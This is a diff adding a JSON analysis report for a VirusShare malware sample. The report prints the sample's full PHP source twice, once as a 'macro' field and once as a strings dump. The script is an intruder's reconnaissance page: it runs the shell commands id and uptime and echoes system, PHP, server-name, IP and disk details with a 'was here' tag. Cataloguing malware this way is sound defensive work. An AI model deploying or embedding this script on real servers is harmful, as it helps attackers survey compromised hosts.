@@ -1,0 +1,81 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "<?php\nfunction ConvertBytes($number)\n{\n        $len = strlen($number);\n        if($len < 4)\n        {\n                return sprintf(\"%d b\", $number);\n        }\n        if($len >= 4 && $len <=6)\n        {\n                return sprintf(\"%0.2f Kb\", $number/1024);\n        }\n        if($len >= 7 && $len <=9)\n        {\n                return sprintf(\"%0.2f Mb\", $number/1024/1024);\n        }\n   \n        return sprintf(\"%0.2f Gb\", $number/1024/1024/1024);\n                           \n}\n\necho \"soerabayaowos<br>\";\n$un = @php_uname();\n$up = system(uptime);\n$id1 = system(id);\n$pwd1 = @getcwd();\n$sof1 = getenv(\"SERVER_SOFTWARE\");\n$php1 = phpversion();\n$name1 = $_SERVER['SERVER_NAME'];\n$ip1 = gethostbyname($SERVER_ADDR);\n$free1= diskfreespace($pwd1);\n$free = ConvertBytes(diskfreespace($pwd1));\nif (!$free) {$free = 0;}\n$all1= disk_total_space($pwd1);\n$all = ConvertBytes(disk_total_space($pwd1));\nif (!$all) {$all = 0;}\n$used = ConvertBytes($all1-$free1);\n$os = @PHP_OS;\n\n\necho \"soerabayaowos was here ..<br>\";\necho \"uname -a: $un<br>\";\necho \"os: $os<br>\";\necho \"uptime: $up<br>\";\necho \"id: $id1<br>\";\necho \"pwd: $pwd1<br>\";\necho \"php: $php1<br>\";\necho \"software: $sof1<br>\";\necho \"server-name: $name1<br>\";\necho \"server-ip: $ip1<br>\";\necho \"free: $free<br>\";\necho \"used: $used<br>\";\necho \"total: $all<br>\";\nexit;"
+    },
+    "filename": "VirusShare_12f89832c5dd0ee6fb692694f21d718c",
+    "filesize": 1366,
+    "filetype": "PHP script, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "12f89832c5dd0ee6fb692694f21d718c",
+        "sha1": "164519c3ef181be1cd5c977747891d06d09776b0",
+        "sha256": "91f0fa9baa66cd5b8a8b1b8506559e85b134376452f06909cbbaf49673aae5e3"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<?php",
+            "function ConvertBytes($number)",
+            "        $len = strlen($number);",
+            "        if($len < 4)",
+            "        {",
+            "                return sprintf(\"%d b\", $number);",
+            "        }",
+            "        if($len >= 4 && $len <=6)",
+            "        {",
+            "                return sprintf(\"%0.2f Kb\", $number/1024);",
+            "        }",
+            "        if($len >= 7 && $len <=9)",
+            "        {",
+            "                return sprintf(\"%0.2f Mb\", $number/1024/1024);",
+            "        }",
+            "        return sprintf(\"%0.2f Gb\", $number/1024/1024/1024);",
+            "                           ",
+            "echo \"soerabayaowos<br>\";",
+            "$un = @php_uname();",
+            "$up = system(uptime);",
+            "$id1 = system(id);",
+            "$pwd1 = @getcwd();",
+            "$sof1 = getenv(\"SERVER_SOFTWARE\");",
+            "$php1 = phpversion();",
+            "$name1 = $_SERVER['SERVER_NAME'];",
+            "$ip1 = gethostbyname($SERVER_ADDR);",
+            "$free1= diskfreespace($pwd1);",
+            "$free = ConvertBytes(diskfreespace($pwd1));",
+            "if (!$free) {$free = 0;}",
+            "$all1= disk_total_space($pwd1);",
+            "$all = ConvertBytes(disk_total_space($pwd1));",
+            "if (!$all) {$all = 0;}",
+            "$used = ConvertBytes($all1-$free1);",
+            "$os = @PHP_OS;",
+            "echo \"soerabayaowos was here ..<br>\";",
+            "echo \"uname -a: $un<br>\";",
+            "echo \"os: $os<br>\";",
+            "echo \"uptime: $up<br>\";",
+            "echo \"id: $id1<br>\";",
+            "echo \"pwd: $pwd1<br>\";",
+            "echo \"php: $php1<br>\";",
+            "echo \"software: $sof1<br>\";",
+            "echo \"server-name: $name1<br>\";",
+            "echo \"server-ip: $ip1<br>\";",
+            "echo \"free: $free<br>\";",
+            "echo \"used: $used<br>\";",
+            "echo \"total: $all<br>\";",
+            "exit;"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.279224",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
